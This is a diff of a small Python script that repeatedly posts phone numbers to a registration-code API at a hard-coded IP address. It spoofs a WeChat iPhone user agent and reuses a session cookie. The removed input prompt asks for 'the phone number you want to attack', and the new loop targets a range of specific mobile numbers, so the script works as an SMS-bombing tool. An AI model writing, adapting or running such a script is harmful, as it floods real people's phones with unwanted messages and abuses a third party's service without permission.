@@ -9,14 +9,13 @@ import time
 
 
 # 评论
-def send(t):
+def send(s):
     headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 MicroMessenger/6.6.5 NetType/WIFI Language/zh_CN'}
     cookies = dict(PHPSESSID='8gah7qc84q7k0eb4uug5j1t8a2')
 
     url = 'http://112.74.179.199:3030/api/registercode'
 
     try:
-        s=input('输入你要攻击的手机号码');
         req=print('建立网站链接 %s' %(s));
         data = {'phone': str(s)};
         req = requests.post(url,cookies=cookies,headers=headers,data=data)
@@ -29,8 +28,8 @@ def send(t):
 
 
 
-for i in range(1, 10):
+for i in range(7440, 7450):
     print(i)
 
-    ww=send(i);
+    ww=send(str(18819460000+i));
     print(ww);
